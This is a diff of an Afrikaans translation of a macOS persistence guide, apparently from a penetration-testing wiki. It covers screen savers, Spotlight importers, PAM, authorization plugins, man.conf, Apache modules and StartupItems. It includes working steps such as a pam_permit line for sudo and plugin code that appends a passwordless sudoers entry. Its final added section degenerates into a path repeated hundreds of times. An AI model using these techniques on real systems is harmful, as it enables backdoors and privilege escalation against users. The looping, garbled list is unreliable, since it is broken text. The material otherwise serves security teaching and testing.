+Toepassings kan `Finder Sync-uitbreidings` hê. Hierdie uitbreiding sal binne 'n toepassing gaan wat uitgevoer sal word. Verder moet die uitbreiding sy kode kan uitvoer **onderteken** wees met 'n geldige Apple-ontwikkelaarsertifikaat, dit moet **gesandboks** wees (hoewel ontspanne uitsonderings bygevoeg kan word) en dit moet geregistreer wees met iets soos:
 ```bash
 pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
 pluginkit -e use -i com.example.InSync.InSync
@@ -982,21 +984,21 @@ Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://p
 #### Ligging
 
 * `/System/Library/Screen Savers`
-* Vereis root-toegang
+* Root benodig
 * **Trigger**: Kies die skermbeveiliging
 * `/Library/Screen Savers`
-* Vereis root-toegang
+* Root benodig
 * **Trigger**: Kies die skermbeveiliging
 * `~/Library/Screen Savers`
 * **Trigger**: Kies die skermbeveiliging
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (35).png" alt="" width="375"><figcaption></figcaption></figure>
 
 #### Beskrywing & Uitbuiting
 
 Skep 'n nuwe projek in Xcode en kies die templaat om 'n nuwe **Skermbeveiliging** te genereer. Voeg dan jou kode daaraan toe, byvoorbeeld die volgende kode om logboeke te genereer.
 
-**Bou** dit, en kopieer die `.saver` bundel na **`~/Library/Screen Savers`**. Maak dan die Skermbeveiliging GUI oop en as jy net daarop klik, behoort dit baie logboeke te genereer:
+**Bou** dit, en kopieer die `.saver` bondel na **`~/Library/Screen Savers`**. Maak dan die Skermbeveiliging GUI oop en as jy net daarop klik, behoort dit baie logboeke te genereer:
 
 {% code overflow="wrap" %}
 ```bash
@@ -1083,23 +1085,23 @@ NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
 
 skryf op: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)
 
-* Nuttig om sandboks te omseil: [🟠](https://emojipedia.org/large-orange-circle)
-* Maar jy sal in 'n aansoek-sandboks eindig
+* Nuttig om sander te omseil: [🟠](https://emojipedia.org/large-orange-circle)
+* Maar jy sal in 'n aansoek-sander eindig
 * TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
-* Die sandboks lyk baie beperk
+* Die sander lyk baie beperk
 
 #### Plek
 
 * `~/Library/Spotlight/`
-* **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die spotlight-inprop bestuur word, word geskep.
+* **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die inprop beheer word, word geskep.
 * `/Library/Spotlight/`
-* **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat de spotlight-inprop bestuur, word geskep.
+* **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat de inprop beheer, word geskep.
 * Wortel nodig
 * `/System/Library/Spotlight/`
-* **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die spotlight-inprop bestuur word, word geskep.
+* **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die inprop beheer word, word geskep.
 * Wortel nodig
 * `Some.app/Contents/Library/Spotlight/`
-* **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat de spotlight-inprop bestuur, word geskep.
+* **Trigger**: 'n Nuwe lêer met 'n uitbreiding wat deur die inprop beheer word, word geskep.
 * Nuwe aansoek nodig
 
 #### Beskrywing & Uitbuiting
@@ -1107,7 +1109,7 @@ skryf op: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit
 Spotlight is macOS se ingeboude soekfunksie, ontwerp om gebruikers **vinnige en omvattende toegang tot data op hul rekenaars** te bied.\
 Om hierdie vinnige soekvermoë te fasiliteer, handhaaf Spotlight 'n **eiendomlike databasis** en skep 'n indeks deur **meeste lêers te ontleden**, wat vinnige soektogte deur beide lêernaam en hul inhoud moontlik maak.
 
-Die onderliggende meganisme van Spotlight behels 'n sentrale proses genaamd 'mds', wat staan vir **'metadata bediener'**. Hierdie proses orkestreer die hele Spotlight-diens. Daar is ook verskeie 'mdworker' duiwels wat 'n verskeidenheid instandhoudingstake uitvoer, soos die indeksering van verskillende lêertipes (`ps -ef | grep mdworker`). Hierdie take word moontlik gemaak deur Spotlight-invoerder-inproppe, of **".mdimporter bundels**", wat Spotlight in staat stel om inhoud oor 'n diverse reeks lêerformate te verstaan en te indekseer.
+Die onderliggende meganisme van Spotlight behels 'n sentrale proses genaamd 'mds', wat staan vir **'metadata bediener'**. Hierdie proses orkestreer die hele Spotlight-diens. Daar is ook verskeie 'mdworker' duiwels wat 'n verskeidenheid instandhoudingstake uitvoer, soos die indeksering van verskillende lêertipes (`ps -ef | grep mdworker`). Hierdie take word moontlik gemaak deur Spotlight-invoerder-inproppe, of **".mdimporter bundels**", wat Spotlight in staat stel om inhoud oor 'n uiteenlopende reeks lêerformate te verstaan en te indekseer.
 
 Die inproppe of **`.mdimporter`** bundels is geleë op die plekke wat voorheen genoem is en as 'n nuwe bundel verskyn, word dit binne minute gelaai (geen diens herlaaiing nodig nie). Hierdie bundels moet aandui watter **lêertipe en uitbreidings hulle kan bestuur**, op hierdie manier sal Spotlight hulle gebruik wanneer 'n nuwe lêer met die aangeduide uitbreiding geskep word.
 
@@ -1157,20 +1159,20 @@ plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 [...]
 ```
 {% hint style="danger" %}
-As jy die Plist van ander `mdimporter` nagaan, mag jy nie die inskrywing **`UTTypeConformsTo`** vind nie. Dit is omdat dit 'n ingeboude _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) is en dit hoef nie lêerspesifikasies te spesifiseer nie.
+As jy die Plist van ander `mdimporter` nagaan, mag jy nie die inskrywing **`UTTypeConformsTo`** vind nie. Dit is omdat dit 'n ingeboude _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) is en dit hoef nie uitbreidings te spesifiseer nie.
 
-Verder het stelselverstekproppe altyd voorrang, so 'n aanvaller kan slegs by lêers kom wat nie andersins deur Apple se eie `mdimporters` geïndekseer word nie.
+Verder, neem stelselverstekkers altyd voorrang, so 'n aanvaller kan slegs toegang verkry tot lêers wat nie andersins deur Apple se eie `mdimporters` geïndekseer word nie.
 {% endhint %}
 
-Om jou eie invoerder te skep, kan jy met hierdie projek begin: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) en dan die naam verander, die **`CFBundleDocumentTypes`** verander en **`UTImportedTypeDeclarations`** byvoeg sodat dit die lêerspesifikasies ondersteun wat jy wil ondersteun en dit in **`schema.xml`** weerspieël.\
-Verander dan die kode van die funksie **`GetMetadataForFile`** om jou lading uit te voer wanneer 'n lêer met die verwerkte lêerspesifikasie geskep word.
+Om jou eie invoerder te skep, kan jy begin met hierdie projek: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) en dan die naam verander, die **`CFBundleDocumentTypes`** verander en **`UTImportedTypeDeclarations`** byvoeg sodat dit die uitbreiding ondersteun wat jy wil ondersteun en dit in **`schema.xml`** weerspieël.\
+Verander dan die kode van die funksie **`GetMetadataForFile`** om jou lading uit te voer wanneer 'n lêer met die verwerkte uitbreiding geskep word.
 
 Laastens **bou en kopieer jou nuwe `.mdimporter`** na een van die vorige liggings en jy kan nagaan wanneer dit gelaai word deur die **logs te monitor** of deur **`mdimport -L`** te kontroleer.
 
 ### ~~Voorkeurpaneel~~
 
 {% hint style="danger" %}
-Dit lyk nie of dit nog werk nie.
+Dit lyk nie of dit meer werk nie.
 {% endhint %}
 
 Verslag: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)
@@ -1187,7 +1189,7 @@ Verslag: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.
 
 #### Beskrywing
 
-Dit lyk nie of dit nog werk nie.
+Dit lyk nie of dit meer werk nie.
 
 ## Root Sandboks Omseiling
 
@@ -1214,7 +1216,8 @@ Verslag: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.
 
 #### Beskrywing & Uitbuiting
 
-Die periodieke skripte (**`/etc/periodic`**) word uitgevoer as gevolg van die **aanvangsdemone** wat gekonfigureer is in `/System/Library/LaunchDaemons/com.apple.periodic*`. Let daarop dat skripte wat in `/etc/periodic/` gestoor word, as die **eienaar van die lêer** uitgevoer word, so dit sal nie werk vir 'n potensiële voorregskalering nie.
+Die periodieke skripte (**`/etc/periodic`**) word uitgevoer as gevolg van die **aanvangsdemone** wat gekonfigureer is in `/System/Library/LaunchDaemons/com.apple.periodic*`. Let daarop dat skripte wat in `/etc/periodic/` gestoor word, uitgevoer word as die **eienaar van die lêer,** dus sal dit nie werk vir 'n potensiële voorreg-escalasie nie.
+
 {% code overflow="wrap" %}
 ```bash
 # Launch daemons that will execute the periodic scripts
@@ -1258,7 +1261,7 @@ monthly_local="/etc/monthly.local"			# Local scripts
 Indien jy enige van die lêers `/etc/daily.local`, `/etc/weekly.local` of `/etc/monthly.local` kan skryf, sal dit **vroeër of later uitgevoer word**.
 
 {% hint style="warning" %}
-Let daarop dat die periodieke skrip **uitgevoer sal word as die eienaar van die skrip**. As 'n gewone gebruiker die skrip besit, sal dit as daardie gebruiker uitgevoer word (dit kan bevoorregtingaanvalle voorkom).
+Let daarop dat die periodieke skripsie **uitgevoer sal word as die eienaar van die skripsie**. As 'n gewone gebruiker die skripsie besit, sal dit as daardie gebruiker uitgevoer word (dit kan bevoorregtingaanvalle voorkom).
 {% endhint %}
 
 ### PAM
@@ -1270,7 +1273,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.
 * Maar jy moet 'n root wees
 * TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Plek
+#### Ligging
 
 * Root altyd vereis
 
@@ -1282,7 +1285,7 @@ Kontroleer PAM-modules met:
 ```bash
 ls -l /etc/pam.d
 ```
-'n Volharding/privilege-escalation tegniek wat PAM misbruik is so maklik soos om die module /etc/pam.d/sudo te wysig deur die lyn aan die begin by te voeg:
+'n Volharding/privilege-escalation tegniek wat PAM misbruik is so maklik soos om die module /etc/pam.d/sudo te wysig deur die lyn aan die begin toe te voeg:
 ```bash
 auth       sufficient     pam_permit.so
 ```
@@ -1297,7 +1300,7 @@ account    required       pam_permit.so
 password   required       pam_deny.so
 session    required       pam_permit.so
 ```
-En dus sal enige poging om **`sudo` te gebruik werk**.
+En dus sal enige poging om **`sudo` te gebruik** werk.
 
 {% hint style="danger" %}
 Let wel dat hierdie gids beskerm word deur TCC, so dit is baie waarskynlik dat die gebruiker 'n versoek om toegang sal kry.
@@ -1310,7 +1313,7 @@ Verslag: [https://posts.specterops.io/persistent-credential-theft-with-authoriza
 
 * Nuttig om sandboks te omseil: [🟠](https://emojipedia.org/large-orange-circle)
 * Maar jy moet 'n root wees en ekstra konfigurasies maak
-* TCC-omseiling: ???
+* TCC omseiling: ???
 
 #### Ligging
 
@@ -1320,7 +1323,7 @@ Verslag: [https://posts.specterops.io/persistent-credential-theft-with-authoriza
 
 #### Beskrywing & Uitbuiting
 
-Jy kan 'n magtigingsinvoegtoepassing skep wat uitgevoer sal word wanneer 'n gebruiker aanmeld om volharding te behou. Vir meer inligting oor hoe om een van hierdie invoegtoepassings te skep, kyk na die vorige verslae (en wees versigtig, 'n swak geskrewe een kan jou buite sluit en jy sal jou Mac van herstelmodus moet skoonmaak).
+Jy kan 'n magtigingsinvoegtoepassing skep wat uitgevoer sal word wanneer 'n gebruiker aanmeld om volharding te behou. Vir meer inligting oor hoe om een van hierdie invoegtoepassings te skep, kyk na die vorige verslae (en wees versigtig, 'n swak geskrewe een kan jou uitsluit en jy sal jou Mac van herstelmodus moet skoonmaak).
 ```objectivec
 // Compile the code and create a real bundle
 // gcc -bundle -framework Foundation main.m -o CustomAuth
@@ -1335,7 +1338,7 @@ NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
 system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
 }
 ```
-**Skuif** die bondel na die plek waar dit gelaai moet word:
+**Skuif** die bundel na die plek om gelaai te word:
 ```bash
 cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
 ```
@@ -1360,7 +1363,7 @@ security authorizationdb write com.asdf.asdf < /tmp/rule.plist
 ```
 Die **`evaluate-mechanisms`** sal die toestemmingsraamwerk vertel dat dit 'n **eksterne meganisme vir toestemming moet aanroep**. Verder sal **`privileged`** dit laat uitvoer word deur root.
 
-Trigger dit met:
+Skakel dit aan met:
 ```bash
 security authorize com.asdf.asdf
 ```
@@ -1382,7 +1385,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.
 
 #### Beskrywing & Uitbuiting
 
-Die konfigurasie lêer **`/private/etc/man.conf`** dui die binêre/skripsie aan om te gebruik wanneer man dokumentasie lêers oopmaak. Dus kan die pad na die uitvoerbare lêer gewysig word sodat enige tyd wanneer die gebruiker man gebruik om 'n paar dokumente te lees, 'n agterdeur uitgevoer word.
+Die konfigurasie lêer **`/private/etc/man.conf`** dui die binêre/skripsie aan om te gebruik wanneer man dokumentasie lêers oopmaak. Dus kan die pad na die uitvoerbare lêer gewysig word sodat enige tyd wat die gebruiker man gebruik om 'n paar dokumente te lees, 'n agterdeur uitgevoer word.
 
 Byvoorbeeld ingestel in **`/private/etc/man.conf`**:
 ```
@@ -1421,11 +1424,11 @@ LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
 
 Op hierdie manier sal jou saamgestelde modules deur Apache gelaai word. Die enigste ding is dat jy dit óf met 'n geldige Apple-sertifikaat moet **teken**, óf jy moet 'n nuwe vertroude sertifikaat in die stelsel **byvoeg** en dit daarmee **teken**.
 
-Dan, indien nodig, om seker te maak dat die bediener gestart word, kan jy uitvoer:
+Dan, indien nodig, om seker te maak dat die bediener gestart sal word, kan jy uitvoer:
 ```bash
 sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
 ```
-Kodevoorbeeld vir die Dylb:
+Voorbeeld van kode vir die Dylb:
 ```objectivec
 #include <stdio.h>
 #include <syslog.h>
@@ -1442,10 +1445,10 @@ syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
 Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)
 
 * Nuttig om sander te omseil: [🟠](https://emojipedia.org/large-orange-circle)
-* Maar jy moet 'n root wees, auditd moet loop en 'n waarskuwing veroorsaak
+* Maar jy moet 'n hoofgebruiker wees, auditd moet loop en 'n waarskuwing veroorsaak
 * TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Ligging
+#### Plek
 
 * **`/etc/security/audit_warn`**
 * Root benodig
@@ -1453,7 +1456,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.
 
 #### Beskrywing & Uitbuiting
 
-Telkens wanneer auditd 'n waarskuwing opspoor, word die skriffie **`/etc/security/audit_warn`** **uitgevoer**. Jy kan dus jou lading daarbyvoeg.
+Telkens wanneer auditd 'n waarskuwing opspoor, word die skripsie **`/etc/security/audit_warn`** **uitgevoer**. Jy kan dus jou lading daarbyvoeg.
 ```bash
 echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
 ```
@@ -1465,10 +1468,10 @@ echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
 
 Die **StartupItem** is 'n gids wat binne `/Library/StartupItems/` of `/System/Library/StartupItems/` geplaas moet word. Nadat hierdie gids gevestig is, moet dit twee spesifieke lêers insluit:
 
-1. 'n **rc-skrip**: 'n skulpskrip wat by aanvang uitgevoer word.
+1. 'n **rc-skrip**: 'n skulpskrip wat by opstart uitgevoer word.
 2. 'n **plist-lêer**, spesifiek genoem `StartupParameters.plist`, wat verskeie konfigurasie-instellings bevat.
 
-Verseker dat beide die rc-skrip en die `StartupParameters.plist`-lêer korrek binne die **StartupItem**-gids geplaas word sodat die aanvangsproses dit kan herken en gebruik.
+Maak seker dat beide die rc-skrip en die `StartupParameters.plist`-lêer korrek binne die **StartupItem**-gids geplaas word sodat die opstartproses hulle kan herken en gebruik.
 
 {% tabs %}
 {% tab title="StartupParameters.plist" %}
@@ -1491,60 +1494,584 @@ Verseker dat beide die rc-skrip en die `StartupParameters.plist`-lêer korrek bi
 {% endtab %}
 
 {% tab title="superservicename" %}  
-### MacOS Auto Start Locations
+### Superdiensnaam
 
-#### Launch Agents
+#### Auto-startlokasies
 
-Launch Agents are used to run processes when a user logs in. They are located in the following directories:
+Hierdie diens kan geaktiveer word deur die volgende lokasies te monitor:
 
-- `/Library/LaunchAgents`
-- `/System/Library/LaunchAgents`
-- `~/Library/LaunchAgents`
-
-#### Launch Daemons
-
-Launch Daemons are used to run processes at system startup. They are located in the following directories:
-
-- `/Library/LaunchDaemons`
-- `/System/Library/LaunchDaemons`
-
-#### Login Items
-
-Login Items are applications that open when a user logs in. They can be managed in:
-
-- System Preferences > Users & Groups > Login Items
-
-#### Startup Items
-
-Startup Items are legacy items that are launched at system startup. They are located in:
-
-- `/Library/StartupItems`
-
-#### Cron Jobs
-
-Cron Jobs are scheduled tasks that run at specific times. They can be managed using the `crontab` command.
-
-#### Kernel Extensions
-
-Kernel Extensions are low-level modules that can extend the functionality of the kernel. They are located in:
-
-- `/Library/Extensions`
-- `/System/Library/Extensions`
-
-#### Other Auto Start Locations
-
-Other auto start locations may include:
-
-- `/Library/LaunchAgents`
-- `/Library/LaunchDaemons`
-- `/Library/StartupItems`
-- `/Library/LaunchDaemons`
-- `/System/Library/LaunchAgents`
-- `/System/Library/LaunchDaemons`
-- `~/Library/LaunchAgents`
-
-It is important to regularly review and monitor these auto start locations to ensure that only legitimate processes are running on the system.  
-{% endtab %}
+- **/Library/LaunchAgents/**
+- **/Library/LaunchDaemons/**
+- **/System/Library/LaunchAgents/**
+- **/System/Library/LaunchDaemons/**
+- **/Applications/**
+- **~/Library/LaunchAgents/**
+- **~/Library/LaunchDaemons/**
+- **~/Library/StartupItems/**
+- **/Library/StartupItems/**
+- **/System/Library/StartupItems/**
+- **/Library/Preferences/**
+- **/Library/PreferencePanes/**
+- **/Library/Internet Plug-Ins/**
+- **/Library/Input Methods/**
+- **/Library/InputManagers/**
+- **/Library/ScriptingAdditions/**
+- **/Library/Widgets/**
+- **/Library/PrivilegedHelperTools/**
+- **/Library/Application Support/**
+- **/Library/Frameworks/**
+- **/Library/QuickLook/**
+- **/Library/Spotlight/**
+- **/Library/ScriptingAdditions/**
+- **/Library/ColorPickers/**
+- **/Library/Services/**
+- **/Library/Audio/Plug-Ins/**
+- **/Library/Printers/**
+- **/Library/Java/**
+- **/Library/Fonts/**
+- **/Library/Logs/**
+- **/Library/Screen Savers/**
+- **/Library/Updates/**
+- **/Library/Widgets/**
+- **/Library/Keychains/**
+- **/Library/Security/**
+- **/Library/Internet Plug-Ins/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
+- **/Library/Widgets/**
